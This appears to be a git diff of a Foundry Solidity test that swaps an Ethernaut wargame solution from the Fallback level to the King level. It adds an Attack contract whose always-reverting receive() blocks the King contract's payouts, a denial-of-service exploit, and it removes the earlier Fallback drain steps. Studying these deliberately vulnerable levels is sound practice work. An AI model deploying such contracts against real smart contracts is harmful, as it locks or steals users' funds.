@@ -3,10 +3,10 @@ pragma solidity ^0.8.27;
 
 import {Test, console} from "forge-std/Test.sol";
 import {StdCheats} from "forge-std/StdCheats.sol";
-import "../src/Fallback/FallbackFactory.sol";
+import "../src/King/KingFactory.sol";
 import "../src/Ethernaut.sol";
 
-contract FallbackTest is StdCheats, Test {
+contract KingTest is StdCheats, Test {
     Ethernaut ethernaut;
     address eoaAddress = address(100);
 
@@ -17,24 +17,22 @@ contract FallbackTest is StdCheats, Test {
         vm.deal(eoaAddress, 5 ether);
     }
 
-    function testFallbackHack() public {
+    function testKingHack() public {
         /////////////////
         // LEVEL SETUP //
         /////////////////
 
-        FallbackFactory fallbackFactory = new FallbackFactory();
-        ethernaut.registerLevel(fallbackFactory);
+        KingFactory kingFactory = new KingFactory();
+        ethernaut.registerLevel(kingFactory);
         vm.startPrank(eoaAddress);
-        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
-        Fallback ethernautFallback = Fallback(payable(levelAddress));
+        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(kingFactory);
+        King ethernautKing = King(payable(levelAddress));
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
-        ethernautFallback.contribute{value: 0.0009 ether}();
-        (bool success,) = address(ethernautFallback).call{value: 1 ether}("");
-        require(success, "");
-        ethernautFallback.withdraw();
+        Attack attack = new Attack{value: 1 ether}(payable(address(ethernautKing)));
+        attack.attack(address(ethernautKing));
 
         //////////////////////
         // LEVEL SUBMISSION //
@@ -43,5 +41,22 @@ contract FallbackTest is StdCheats, Test {
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract Attack {
+    address payable target;
+
+    constructor(address payable _target) payable {
+        target = _target;
+    }
+
+    function attack(address target) public {
+        King king = King(payable(target));
+        (bool success,) = address(king).call{value: 1 ether}("");
+    }
+
+    receive() external payable {
+        revert();
     }
 }
